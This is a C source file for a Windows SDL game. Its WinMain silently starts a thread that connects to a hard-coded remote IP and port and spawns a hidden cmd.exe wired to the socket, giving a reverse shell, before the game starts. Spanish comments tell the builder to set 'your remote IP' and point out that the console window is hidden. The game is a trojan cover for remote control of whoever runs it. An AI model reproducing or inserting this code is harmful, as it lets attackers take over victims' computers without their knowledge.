#include "time.h"
#include "definitions.h"
#include "game.h"
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>  // 🔴 Debe ir antes de windows.h
#include <windows.h>
#include <io.h>
#include <process.h>
#include <sys/types.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")  // Enlazar Winsock2

/* ================================================== */
/* |     CAMBIAR ESTO A LA IP Y PUERTO DEL CLIENTE  | */
/* ================================================== */
#if !defined(CLIENT_IP) || !defined(CLIENT_PORT)
# define CLIENT_IP "172.16.0.8"  // 🔴 CAMBIAR A TU IP REMOTA
# define CLIENT_PORT 80         // 🔴 CAMBIAR AL PUERTO CORRECTO
#endif
/* ================================================== */

DWORD WINAPI rev(LPVOID arg) {
    if (strcmp(CLIENT_IP, "0.0.0.0") == 0 || CLIENT_PORT == 0) {
        write(2, "[ERROR] CLIENT_IP and/or CLIENT_PORT not defined.\n", 50);
        return 1;
    }

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
        write(2, "[ERROR] WSAStartup failed.\n", 27);
        return 1;
    }

    struct sockaddr_in sa;
    SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(CLIENT_PORT);
    sa.sin_addr.s_addr = inet_addr(CLIENT_IP);

#ifdef WAIT_FOR_CLIENT
    while (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
        Sleep(5000);
    }
#else
    if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
        write(2, "[ERROR] connect failed.\n", 24);
        return 1;
    }
#endif

    STARTUPINFO sinfo;
    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    sinfo.hStdInput = (HANDLE)sockt;
    sinfo.hStdOutput = (HANDLE)sockt;
    sinfo.hStdError = (HANDLE)sockt;
    sinfo.wShowWindow = SW_HIDE;  // 🔴 Esto oculta la ventana de cmd.exe

    PROCESS_INFORMATION pinfo;
    CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);

    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    HANDLE thread = CreateThread(NULL, 0, rev, NULL, 0, NULL);
    if (thread == NULL) {
        return 1;
    }
    CloseHandle(thread);  // No bloquea el hilo principal

    srand(time(NULL));

    if (init_game() != 0) {
        SDL_LogError(0, "Failed to start game\n");
        return 1;
    }

    while (1) {
        int res = game_loop();
        if (res != 0) {
            if (res < 0) {
                SDL_LogError(0, "Unexpected error occurred\n");
            }
            break;
        }
    }

    if (terminate_game() != 0) {
        SDL_LogError(0, "Error while terminating game\n");
    }

    return 0;
}
